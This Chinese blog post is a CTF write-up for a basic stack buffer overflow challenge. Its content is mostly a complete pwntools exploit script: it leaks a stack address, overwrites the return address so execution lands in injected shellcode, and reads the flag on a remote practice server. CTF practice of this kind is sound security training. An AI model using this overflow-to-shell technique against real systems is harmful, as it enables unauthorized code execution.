# root_me_stack_buffer_overflow_basic



### 总结

基础的`ret2shellcode`的题目，直接用`pwntools`生成`shellcode`即可。

<!-- more -->

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

context.binary = "./root_me_stack_buffer_overflow_basic"
context.log_level = "debug"

io = remote("node4.buuoj.cn", 29064)

sh = shellcraft.sh()

data = "aaaa"
io.sendlineafter("Give me data to dump:\n", data)
m = io.recvline()
log_ex(f"Get msg: {m}")
stack_addr = int16_ex(m[:10])
log_address("stack_addr", stack_addr)
io.sendlineafter("Dump again (y/n):\n", "y")

data = flat({
    0:asm(sh),
    164: stack_addr
})
io.sendlineafter("Give me data to dump:\n", data)
io.sendlineafter("Dump again (y/n):\n", "n")

io.sendline("cat flag")

io.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-03-05-root-me-stack-buffer-overflow-basic/  

